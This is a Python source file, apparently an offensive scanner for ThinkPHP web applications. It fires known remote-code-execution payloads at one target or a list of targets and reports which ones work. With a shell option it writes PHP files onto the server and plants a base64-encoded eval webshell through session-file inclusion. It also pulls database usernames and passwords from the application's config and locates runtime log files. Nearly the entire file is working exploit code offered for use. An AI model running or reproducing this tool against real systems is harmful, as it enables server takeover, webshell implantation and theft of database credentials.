#coding:utf-8

'''
需求：
日志读取功能
完善通过echo MD5来判断
日志查找
自定义目录
'''

import requests
from urllib import parse
import urllib3
import base64
import argparse
import time
from bs4 import BeautifulSoup
#proxies={"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

headers = {
    "Host": "",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)",
    "Connection": "close",
    "Content-Type": "application/x-www-form-urlencoded",
    "Cookie": "PHPSESSID=doo8htm6c4v8qtk7djkqm97mh2; Hm_lvt_31a988db7810b2d29dc2e834e87de160=1587714930; __51cke__=; Hm_lpvt_31a988db7810b2d29dc2e834e87de160=1587715063; __tins__19783839=%7B%22sid%22%3A%201587715044477%2C%20%22vd%22%3A%205%2C%20%22expires%22%3A%201587716909551%7D; __51laig__=5"
}

def think_rce_check(host):
    print('\033[1;34m[!] thinkphp_RCE探测：\033[0m')
    # 5.0.x命令执行，<=5.0.24
    success = []
    headers["Host"] = parse.urlparse(host).hostname
    payloads = [r"/?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
                r"/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=exit(md5(%27test%27))",
                r"/?s=index/think\request/input?data[]=phpinfo()&filter=assert",
                r"/?s=index/think\request/input?data[]=exit(md5(%27test%27))&filter=assert",
                r"/?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>",
                r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",
                r"/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",
                r"/?s=index/\think\Request/input&filter[]=assert&data=phpinfo()",
                r"/?s=index/\think\Request/input&filter[]=phpinfo&data=-1"]
    try:
        for i in payloads:
            url = host + i
            res = requests.get(url=url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            if ('PHP Version' in res.text) or ('PHP Extension Build' in res.text) or ("098f6bcd4621d373cade4e832627b4f6" in res.text):
                success.append(i)
            else:
                pass
    except:
        print("\033[1;31m网络出错！\033[0m")
        pass

    #if not success:
        # ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
    test_str = "098f6bcd4621d373cade4e832627b4f6"
    url2 = host + "/?s=captcha&test=-1"
    post_ = [r'_method=__construct&filter=phpinfo&method=get&server[REQUEST_METHOD]=1',
             r'_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=curl ' + host + '/robots.txt',
             r'_method=__construct&filter[]=system&method=GET&get[]=curl ' + host + '/robots.txt']
    try:
        for j in post_:
            res2 = requests.request('POST', url2, data=j, headers=headers, timeout=5, verify=False, allow_redirects=False)
            if ('PHP Version' in res2.text) or ('PHP Extension Build' in res2.text) or ("Disallow" in res2.text):
                payload_post1 = url2 + "  POST: " + j
                success.append(payload_post1)
            else:
                pass
    except:
        print("\033[1;31m网络出错！\033[0m")
        pass

    url3 = host + "/?s=captcha&test=exit(md5(%27test%27))"
    post_1 = r'_method=__construct&filter[]=assert&method=get&server[REQUEST_METHOD]=-1'
    try:
        res3 = requests.request('POST', url3, data=post_1, headers=headers, timeout=5, verify=False, allow_redirects=False)
        if  ("098f6bcd4621d373cade4e832627b4f6" in res3.text):
            payload_post2 = url3 + "  POST: " + post_1
            success.append(payload_post2)
        else:
            pass
    except:
        print("\033[1;31m网络出错！\033[0m")
        pass

    # ThinkPHP <= 5.0.13
    url4 = host + "/?s=index/index/"
    post_2 = [r's=-1&_method=__construct&method=&filter[]=phpinfo',
             r's=curl ' + host + '/robots.txt' + '&_method=__construct&method=&filter[]=system'.format(test_str)]
    try:
        for k in post_2:
            res4 = requests.request('POST', url4, data=k, headers=headers, timeout=5, verify=False, allow_redirects=False)
            if ('PHP Version' in res3.text) or ('PHP Extension Build' in res4.text) or (
                    "Disallow" in res4.text):
                payload_post3 = url4 + "  POST: " + k
                success.append(payload_post3)
            else:
                pass
    except:
        print("\033[1;31m网络出错！\033[0m")
        pass

    # ThinkPHP <= 5.0.23、5.1.0 <= 5.1.16 需要开启框架app_debug
    url5 = host
    post_3 = [r'_method=__construct&filter[]=phpinfo&server[REQUEST_METHOD]=-1',
             r'_method=__construct&filter[]=system&server[REQUEST_METHOD]=curl ' + host + '/robots.txt']
    try:
        for y in post_3:
            res5 = requests.request('POST', url5, data=y, headers=headers, timeout=5, verify=False, allow_redirects=False)
            if ('PHP Version' in res5.text) or ('PHP Extension Build' in res5.text) or (
                    "Disallow" in res5.text):
                payload_post4 = url5 + "  POST: " + y
                success.append(payload_post4)
            else:
                pass
    except:
        print("\033[1;31m网络出错！\033[0m")
        pass

    if success:
        print("\033[1;34m[!] 存在thinkphp_RCE! 可用Payload:\033[0m")
        for p in success:
            print("\033[1;32m{}\033[0m".format(p))
    else:
        print("\033[1;31m[!] 不存在thinkphp_RCE!\033[0m")

def getshell(host):
    print("\033[1;34m[!]正在尝试Getshell：\033[0m")
    headers["Host"] = parse.urlparse(host).hostname
    success = False
    shell = "<?php phpinfo();?>"
    payload = [r"/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=1ndex.php&vars[1][]=" + shell,
               r"/?s=index/\think\template\driver\file/write&cacheFile=1ndex.php&content=" + shell,
               ]
    for k in payload:
        url = host + k
        try:
            res_get = requests.get(url=url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False, allow_redirects=False)
            if getshell_res.status_code == 200:
                print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/1ndex.php\n\033[0m")
                success = True
                break
            else:
                pass
        except:
            print("\033[1;31m[!] ERROR, Getshell Failed\033[0m")

    if not success:
        # ThinkPHP <= 5.0.23 需要存在xxx的method路由，例如captcha
        post_payload1 = r'_method=__construct&filter=system&method=get&server[REQUEST_METHOD]=echo+\'"{}"\'+>>1ndex.php'.format(shell)
        try:
            res2_get = requests.request("POST", host+"/?s=captcha&test=1", data=post_payload1, headers=headers, timeout=5, verify=False, allow_redirects=False)
            getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False, allow_redirects=False)
            if getshell_res.status_code == 200:
                print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/2ndex.php\n\033[0m")
                success = True
            else:
                pass
        except:
            pass

    if not success:
        # ThinkPHP <= 5.0.13
        post_payload2 = [r's=echo+ "{}" +>>1ndex.php&_method=__construct&method=&filter[]=system'.format(shell),
                         r'_method=__construct&filter[]=system&mytest=echo+ "{}" +>>1ndex.php'.format(shell)]
        for h in post_payload2:
            try:
                res3_get = requests.request("POST", host+"/?s=index/index", data=post_payload2[0], headers=headers, timeout=5, verify=False, allow_redirects=False)
                getshell_res = requests.get(url=host + "/1ndex.php", headers=headers, timeout=5, verify=False, allow_redirects=False)
                if getshell_res.status_code == 200:
                    print("\033[1;32m[+] Getshell succeed，shell address： " + host + "/3ndex.php\n\033[0m")
                    success = True
                    break
                else:
                    pass
            except:
                pass

    if not success:
        # 参考链接：https://www.cnblogs.com/r00tuser/p/11410157.html
        sess = "tudou7test"
        headers.update({"Cookie": "PHPSESSID={}".format(sess)})
        sess_dir = 'php://filter/read=convert.base64-decode/resource=/tmp/sess_{}'.format(sess).encode(encoding="utf-8")
        base64_ = base64.b64encode(sess_dir).decode()
        post_payload4 = r'_method=__construct&filter[]=think\Session::set&method=get&get[]=abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&server[]=1'
        post_res = r'_method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}'.format(base64_)
        try:
            res5_get = requests.request("POST", host+"/?s=captcha&test=1", data=post_payload4, headers=headers, timeout=5, verify=False, allow_redirects=False)
            getshell_res = requests.request("POST", host+"/?s=captcha&r=cGhwaW5mbygpOw==", data=post_res, headers=headers, timeout=5, verify=False, allow_redirects=False)
            if ('PHP Version' in getshell_res.text) or ('PHP Extension Build' in getshell_res.text):
                print("\033[1;32m[+] Getshell success, You can use POST " + host + "/?s=captcha&r=cGhwaW5mbygpOw==\n\033[0m" + "\033[1;32m[=]  _method=__construct&filter[]=base64_decode&filter[]=think\__include_file&method=get&server[]=1&get[]={}\033[0m".format(base64_))
                print("\033[1;32m[+] r 参数是命令的base64编码\n\033[0m")
                success = True
            else:
                pass
        except:
            pass

    if not success:
        post_payload5 = r'_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]={}<?php md5("test");?>'.format(shell)
        time_dir = time.strftime("%Y%m/%d", time.localtime())
        try:
            res5_get = requests.request("POST", host + "/?s=captcha", data=post_payload5, headers=headers, timeout=5,
                                    verify=False, allow_redirects=False)
            dir_ = "../runtime/log/{}.log".format(time_dir)
            url = host + "/?s=index/\\think\Lang/load&file=" + dir_
            getshell_res = requests.get(url=url)
            if ("098f6bcd4621d373cade4e832627b4f6" in getshell_res.text):
                print('\033[1;32m[+] Getshell success: ' + url + "\n\033[0m")
                success = True
            else:
                pass
        except:
            pass
    if not success:
        print("\033[1;31m[!]Getshell失败！\033[0m")

    return success

def get_mysql_conf(host):
    headers["Host"] = parse.urlparse(host).hostname
    print("\033[1;34m[!] 尝试获取数据库配置:\033[0m")
    mysql_success = False
    try:
        name = requests.get(url=host+"/?s=index/think\config/get&name=database.username",  headers=headers, timeout=5, verify=False, allow_redirects=False)
        hostname = requests.get(url=host + "/?s=index/think\config/get&name=database.hostname", headers=headers, timeout=5,
                                verify=False, allow_redirects=False)
        password = requests.get(url=host + "/?s=index/think\config/get&name=database.password", headers=headers, timeout=5,
                                verify=False, allow_redirects=False)
        database = requests.get(url=host + "/?s=index/think\config/get&name=database.database", headers=headers, timeout=5,
                                verify=False, allow_redirects=False)
        if len(name.text) < 100:
            print("\033[1;32m[+] database username: \033[0m" + name.text)
            mysql_success = True
        if len(hostname.text) < 100:
            print("\033[1;32m[+] database hostname: \033[0m" + hostname.text)
        if len(password.text) < 100:
            print("\033[1;32m[+] database password: \033[0m" + password.text)
        if len(database.text) < 100:
            print("\033[1;32m[+] database name: \033[0m" + database.text + "\n")
        if not mysql_success:
            print("\033[1;31m[!] 数据库配置获取失败\033[0m")
    except:
        pass

def log_find(host):
    headers["Host"] = parse.urlparse(host).hostname
    print('\033[1;34m[!] 日志文件路径探测：\033[0m')
    time_dir_5 = time.strftime("%Y%m/%d", time.localtime())
    # thinkphp 5 主日志 info
    log_dir_info_5 = host + "/../runtime/log/{}.log".format(time_dir_5)
    # 错误日志 error
    log_dir_error_5 = host + "/../runtime/log/{}_error.log".format(time_dir_5)
    # sql日志 sql
    log_dir_sql_5 = host + "/../runtime/log/{}_sql.log".format(time_dir_5)
    try:
        info_res = requests.get(url=log_dir_info_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
        error_res = requests.get(url=log_dir_error_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
        sql_res = requests.get(url=log_dir_sql_5, headers=headers, timeout=5, verify=False, allow_redirects=False)
        if info_res.status_code == 200 and (("[ info ]" in info_res.text) or ("[ sql ]" in info_res.text) or ("[ error ]" in info_res.text)):
            print("\033[1;32m[+] info日志存在: \033[0m" + log_dir_info_5)
        if error_res.status_code == 200 and (("[ info ]" in error_res.text) or ("[ sql ]" in error_res.text) or ("[ error ]" in error_res.text)):
            print("\033[1;32m[+] error日志存在: \033[0m" + log_dir_error_5)
        if sql_res.status_code == 200 and (("[ info ]" in sql_res.text) or ("[ sql ]" in sql_res.text) or ("[ error ]" in sql_res.text)):
            print("\033[1;32m[+] sql日志存在: \033[0m" + log_dir_sql_5)
    except:
        print("\033[1;31m网络出错！\033[0m")

    # thinkphp 3 日志
    time_dir_3 = time.strftime("%y_%m_%d", time.localtime())
    log_dir_3_1 = host + "/Application/Runtime/Logs/Home/{}.log".format(time_dir_3)
    log_dir_3_2 = host + "/Runtime/Logs/Home/{}.log".format(time_dir_3)
    log_dir_3_3 = host + "/Runtime/Logs/Common/{}.log".format(time_dir_3)
    log_dir_3_4 = host + "/Application/Runtime/Logs/Common/{}.log".format(time_dir_3)
    log_dir_3 = [log_dir_3_1, log_dir_3_2, log_dir_3_3, log_dir_3_4]
    for i in log_dir_3:
        try:
            log_3_res = requests.get(url=i, headers=headers, timeout=5, verify=False, allow_redirects=False)
            log_3_res.encoding = 'utf-8'
            if log_3_res.status_code == 200 and (("INFO:" in log_3_res.text) or ("SQL语句" in log_3_res.text)):
                print("\033[1;32m[+] 日志存在: \033[0m" + i)
            else:
                pass
        except:
            print("\033[1;31m网络出错！\033[0m")

def check_dubug(host):
    headers["Host"] = parse.urlparse(host).hostname
    div_html_5 = ''
    div_html_3 = ''
    print("\033[1;34m[+] 检测Debug模式是否开启: \033[0m")
    debug_bool = False
    url_debug=["indx.php", "/index.php/?s=index/inex/"]
    #url_debug = host + "/index.php/?s=index/inex/"
    for i in url_debug:
        try:
            res_debug = requests.get(url=host+i, headers=headers, timeout=5, verify=False, allow_redirects=False)
            res_debug.encoding = 'utf-8'
            #print(res_debug.text)
            if ("Environment Variables" in res_debug.text) or ("错误位置" in res_debug.text):
                print("\033[1;32m[+] Debug 模式已开启！\033[0m")
                debug_bool = True
                res_debug_html = BeautifulSoup(res_debug.text, 'html.parser')
                div_html_5 = res_debug_html.findAll('div', {'class':'clearfix'})
                div_html_3 = res_debug_html.find('sup')
                div_html_3_path = res_debug_html('div', {'class': 'text'})
                break
        except:
            print("\033[1;31m[+] 检测出错\033[0m")
    if debug_bool == False:
        print("\033[1;31m[+] Debug 模式未开启！\033[0m")
    if debug_bool:
        if div_html_5:
            for j in div_html_5:
                if j.strong.text == 'THINK_VERSION':
                    print("\033[1;32m[+] ThinkPHP Version: {}\033[0m".format(j.small.text.strip()))
                if j.strong.text == 'DOCUMENT_ROOT':
                    print("\033[1;32m[+] DOCUMENT ROOT: {}\033[0m".format(j.small.text.strip()))
                if j.strong.text == 'SERVER_ADDR':
                    print("\033[1;32m[+] SERVER ADDR: {}\033[0m".format(j.small.text.strip()))
                if j.strong.text == 'LOG_PATH':
                    print("\033[1;32m[+] LOG PATH: {}\033[0m".format(j.small.text.strip()))
        elif div_html_3 and div_html_3_path:
            print("\033[1;32m[+] ThinkPHP Version: {}\033[0m".format(div_html_3.text))
            print("\033[1;32m[+] ThinkPHP Path: {}\033[0m".format(div_html_3_path[0].p.text))


def check_host(host):
    if not host.startswith("http"):
        print('\033[1;31m[x] ERROR: Host "{}" should start with http or https\n\033[0m'.format(host))
        return False
    else:
        return True

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Thinkphp Scan')
    parser.add_argument(
        "-u", "--url", help='Start scanning url -u xxx.com')
    parser.add_argument("-f", "--file", help='read the url from the file')
    parser.add_argument("--shell", help='try to get shell', action='store_true')
    args = parser.parse_args()
    if args.url and check_host(args.url):
        print("\033[1;34m[!][!][!] {} Start\033[0m".format(args.url))
        log_find(args.url)
        check_dubug(args.url)
        think_rce_check(args.url)
        get_mysql_conf(args.url)
        if args.shell:
            getshell(args.url)
    if args.file:
        f = open(args.file, "r")
        host = f.readlines()
        real_host = []
        for i in host:
            url = i.strip('\n')
            print("\033[1;34m[!][!][!] {} Start\033[0m".format(url))
            if check_host(url):
                log_find(url)
                check_dubug(url)
                think_rce_check(url)
                get_mysql_conf(url)
                if args.shell:
                    getshell(url)

